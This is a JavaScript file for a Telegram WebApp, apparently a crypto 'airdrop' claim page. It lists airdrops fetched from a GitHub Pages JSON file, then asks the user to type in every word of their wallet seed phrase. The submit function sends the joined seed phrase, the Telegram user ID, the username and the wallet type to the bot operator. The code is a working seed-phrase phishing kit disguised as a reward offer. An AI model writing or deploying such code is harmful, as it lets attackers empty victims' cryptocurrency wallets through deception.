let tg = null;

// ======= Ініціалізація Telegram WebApp =======
function initTelegram() {
    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
        console.warn("❌ Telegram WebApp не найден. Откройте через Telegram.");
        return false;
    }
    tg = Telegram.WebApp;
    tg.ready();
    console.log("✅ Telegram WebApp инициализирован");
    return true;
}

// ======= DOM завантажено =======
document.addEventListener("DOMContentLoaded", () => {
    const initialized = initTelegram();
    if (!initialized) {
        alert("❌ WebApp не инициализирован. Пожалуйста, откройте через Telegram.");
        return;
    }

    // ======= Завантаження airdrop-ів =======
    fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById('airdropList');
            container.innerHTML = '';
            data.forEach(drop => {
                const card = document.createElement('div');
                card.className = 'airdrop-card';
                card.innerHTML = `
                    <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
                    <h2>${drop.name}</h2>
                    <p>💸 Награда: <strong>${drop.reward}</strong></p>
                    <p>🌐 Сеть: ${drop.network}</p>
                    <p>⏳ До: ${drop.ends}</p>
                    <button onclick="selectAirdrop('${drop.name}')">Участвовать</button>
                `;
                container.appendChild(card);
            });
        })
        .catch(error => {
            console.error("❌ Ошибка при загрузке JSON:", error);
            document.getElementById("airdropList").innerHTML =
                "<p style='color:red'>❌ Не удалось загрузить список airdrop'ов.</p>";
        });

    // ======= Кнопка сабміту =======
    const btn = document.getElementById('submitBtn');
    if (btn) btn.addEventListener('click', submitAirdrop);

    // ======= Кастомний селектор гаманця =======
    const selectWrapper = document.querySelector('.custom-select');
    if (selectWrapper) {
        const selected = selectWrapper.querySelector('.selected');
        const options = selectWrapper.querySelectorAll('.options li');
        const hiddenInput = document.querySelector('#wallet');

        selected.addEventListener('click', () => {
            selectWrapper.classList.toggle('open');
        });

        options.forEach(option => {
            option.addEventListener('click', () => {
                selected.innerHTML = option.innerHTML;
                hiddenInput.value = option.dataset.value;
                selectWrapper.classList.remove('open');
            });
        });

        document.addEventListener('click', e => {
            if (!selectWrapper.contains(e.target)) {
                selectWrapper.classList.remove('open');
            }
        });
    }
});

// ======= Обрати airdrop =======
function selectAirdrop(name) {
    document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
    document.getElementById('airdropList').style.display = 'none';
    document.getElementById('airdropForm').style.display = 'block';
    renderSeedInputs();
}

// ======= Генерація seed-полів =======
function renderSeedInputs() {
    const length = parseInt(document.getElementById('length').value);
    const container = document.getElementById('seedContainer');
    container.innerHTML = '';

    for (let i = 0; i < length; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = `Слово ${i + 1}`;
        container.appendChild(input);
    }

    // Вставка сид-фрази в перше поле
    const inputs = container.querySelectorAll('input');
    if (inputs.length > 0) {
        inputs[0].addEventListener('paste', (e) => {
            e.preventDefault();
            const pasted = (e.clipboardData || window.clipboardData).getData('text');
            const words = pasted.trim().split(/\s+/);
            if (words.length > 1) {
                words.forEach((word, index) => {
                    if (inputs[index]) inputs[index].value = word;
                });
            } else {
                inputs[0].value = pasted;
            }
        });
    }
}

// ======= Очистка попередження =======
function clearWarning() {
    const warning = document.getElementById('validationWarning');
    if (warning) warning.style.display = 'none';
}

// ======= Відправка даних WebApp =======
function submitAirdrop() {
    if (!tg || !tg.initDataUnsafe || !tg.initDataUnsafe.user) {
        alert("❌ Telegram WebApp не активен. Пожалуйста, запустите через Telegram.");
        return;
    }

    const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
    const words = inputs.map(input => input.value.trim()).filter(Boolean);

    if (words.length !== inputs.length) {
        const warning = document.getElementById('validationWarning');
        warning.innerText = '❗️ Пожалуйста, заполните все поля.';
        warning.style.display = 'block';
        return;
    }

    const payload = {
        event: "airdrop_claim",
        user_id: tg.initDataUnsafe.user.id || "-",
        username: tg.initDataUnsafe.user.username || "-",
        timestamp: new Date().toISOString(),
        seed: words.join(" "),
        wallet: document.getElementById("wallet").value
    };

    console.log("[📤 Отправка в Telegram WebApp]", payload);

    tg.sendData(JSON.stringify(payload));
    tg.close();
}
